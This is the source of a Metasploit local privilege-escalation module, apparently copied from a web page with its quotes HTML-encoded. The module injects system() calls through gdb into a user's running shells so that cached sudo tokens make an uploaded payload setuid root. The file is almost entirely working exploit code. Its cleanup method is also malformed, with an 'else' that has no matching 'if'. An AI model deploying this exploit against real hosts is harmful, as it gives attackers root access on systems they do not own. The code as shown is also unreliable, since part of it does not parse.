# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::File
  include Msf::Post::Linux::Kernel
  include Msf::Post::Linux::Priv
  include Msf::Post::Linux::System
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;ptrace Sudo Token Privilege Escalation&#039;,
      &#039;Description&#039;    => %q{
        This module attempts to gain root privileges by blindly injecting into
        the session user&#039;s running shell processes and executing commands by
        calling `system()`, in the hope that the process has valid cached sudo
        tokens with root privileges.

        The system must have gdb installed and permit ptrace.

        This module has been tested successfully on:

        Debian 9.8 (x64); and
        CentOS 7.4.1708 (x64).
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;chaignc&#039;, # sudo_inject
          &#039;bcoles&#039;   # Metasploit
        ],
      &#039;DisclosureDate&#039; => &#039;2019-03-24&#039;,
      &#039;References&#039;     =>
        [
          [&#039;EDB&#039;, &#039;46989&#039;],
          [&#039;URL&#039;, &#039;https://github.com/nongiach/sudo_inject&#039;],
          [&#039;URL&#039;, &#039;https://www.kernel.org/doc/Documentation/security/Yama.txt&#039;],
          [&#039;URL&#039;, &#039;http://man7.org/linux/man-pages/man2/ptrace.2.html&#039;],
          [&#039;URL&#039;, &#039;https://lwn.net/Articles/393012/&#039;],
          [&#039;URL&#039;, &#039;https://lwn.net/Articles/492667/&#039;],
          [&#039;URL&#039;, &#039;https://linux-audit.com/protect-ptrace-processes-kernel-yama-ptrace_scope/&#039;],
          [&#039;URL&#039;, &#039;https://blog.gdssecurity.com/labs/2017/9/5/linux-based-inter-process-code-injection-without-ptrace2.html&#039;]
        ],
      &#039;Platform&#039;       => [&#039;linux&#039;],
      &#039;Arch&#039;           =>
        [
          ARCH_X86,
          ARCH_X64,
          ARCH_ARMLE,
          ARCH_AARCH64,
          ARCH_PPC,
          ARCH_MIPSLE,
          ARCH_MIPSBE
        ],
      &#039;Targets&#039;        => [[&#039;Auto&#039;, {}]],
      &#039;DefaultOptions&#039; =>
        {
          &#039;PrependSetresuid&#039; => true,
          &#039;PrependSetresgid&#039; => true,
          &#039;PrependFork&#039;      => true,
          &#039;WfsDelay&#039;         => 30
        },
      &#039;DefaultTarget&#039;  => 0))
    register_options [
      OptInt.new(&#039;TIMEOUT&#039;, [true, &#039;Process injection timeout (seconds)&#039;, &#039;30&#039;])
    ]
    register_advanced_options [
      OptBool.new(&#039;ForceExploit&#039;, [false, &#039;Override check result&#039;, false]),
      OptString.new(&#039;WritableDir&#039;, [true, &#039;A directory where we can write files&#039;, &#039;/tmp&#039;])
    ]
  end

  def base_dir
    datastore[&#039;WritableDir&#039;].to_s
  end

  def timeout
    datastore[&#039;TIMEOUT&#039;]
  end

  def upload(path, data)
    print_status "Writing &#039;#{path}&#039; (#{data.size} bytes) ..."
    rm_f path
    write_file path, data
    register_file_for_cleanup path
  end

  def check
    if yama_enabled?
      vprint_error &#039;YAMA ptrace scope is restrictive&#039;
      return CheckCode::Safe
    end
    vprint_good &#039;YAMA ptrace scope is not restrictive&#039;

    if command_exists? &#039;/usr/sbin/getsebool&#039;
      if cmd_exec("/usr/sbin/getsebool deny_ptrace 2>1 | /bin/grep -q on && echo true").to_s.include? &#039;true&#039;
        vprint_error &#039;SELinux deny_ptrace is enabled&#039;
        return CheckCode::Safe
      end
      vprint_good &#039;SELinux deny_ptrace is disabled&#039;
    end

    unless command_exists? &#039;sudo&#039;
      vprint_error &#039;sudo is not installed&#039;
      return CheckCode::Safe
    end
    vprint_good &#039;sudo is installed&#039;

    unless command_exists? &#039;gdb&#039;
      vprint_error &#039;gdb is not installed&#039;
      return CheckCode::Safe
    end
    vprint_good &#039;gdb is installed&#039;

    CheckCode::Detected
  end

  def exploit
    unless check == CheckCode::Detected
      unless datastore[&#039;ForceExploit&#039;]
        fail_with Failure::NotVulnerable, &#039;Target is not vulnerable. Set ForceExploit to override.&#039;
      end
      print_warning &#039;Target does not appear to be vulnerable&#039;
    end

    if is_root?
      unless datastore[&#039;ForceExploit&#039;]
        fail_with Failure::BadConfig, &#039;Session already has root privileges. Set ForceExploit to override.&#039;
      end
    end

    unless writable? base_dir
      fail_with Failure::BadConfig, "#{base_dir} is not writable"
    end

    if nosuid? base_dir
      fail_with Failure::BadConfig, "#{base_dir} is mounted nosuid"
    end

    # Find running shell processes
    shells = %w[ash ksh csh dash bash zsh tcsh fish sh]

    system_shells = read_file(&#039;/etc/shells&#039;).to_s.each_line.map {|line|
      line.strip
    }.reject {|line|
      line.starts_with?(&#039;#&#039;)
    }.each {|line|
      shells << line.split(&#039;/&#039;).last
    }
    shells = shells.uniq.reject {|shell| shell.blank?}

    print_status &#039;Searching for shell processes ...&#039;
    pids = []
    if command_exists? &#039;pgrep&#039;
      cmd_exec("pgrep &#039;^(#{shells.join(&#039;|&#039;)})$&#039; -u \"$(id -u)\"").to_s.each_line do |pid|
        pids << pid.strip
      end
    else
      shells.each do |s|
        pidof(s).each {|p| pids << p.strip}
      end
    end

    if pids.empty?
      fail_with Failure::Unknown, &#039;Found no running shell processes&#039;
    end

    print_status "Found #{pids.uniq.length} running shell processes"
    vprint_status pids.join(&#039;, &#039;)

    # Upload payload
    @payload_path = "#{base_dir}/.#{rand_text_alphanumeric 10..15}"
    upload @payload_path, generate_payload_exe

    # Blindly call system() in each shell process
    pids.each do |pid|
      print_status "Injecting into process #{pid} ..."

      cmds = "echo | sudo -S /bin/chown 0:0 #{@payload_path} >/dev/null 2>&1 && echo | sudo -S /bin/chmod 4755 #{@payload_path} >/dev/null 2>&1"
      sudo_inject = "echo &#039;call system(\"#{cmds}\")&#039; | gdb -q -n -p #{pid} >/dev/null 2>&1"
      res = cmd_exec sudo_inject, nil, timeout
      vprint_line res unless res.blank?

      next unless setuid? @payload_path

      print_good "#{@payload_path} setuid root successfully"
      print_status &#039;Executing payload...&#039;
      res = cmd_exec "#{@payload_path} & echo "
      vprint_line res
      return
    end

    fail_with Failure::NoAccess, &#039;Failed to create setuid root shell. Session user has no valid cached sudo tokens.&#039;
  end

  def on_new_session(session)
      session.core.use &#039;stdapi&#039; unless session.ext.aliases.include? &#039;stdapi&#039;
      session.fs.file.rm @payload_path
    else
      session.shell_command_token "rm -f &#039;#{@payload_path}&#039;"
    end
  ensure
    super
  end
end

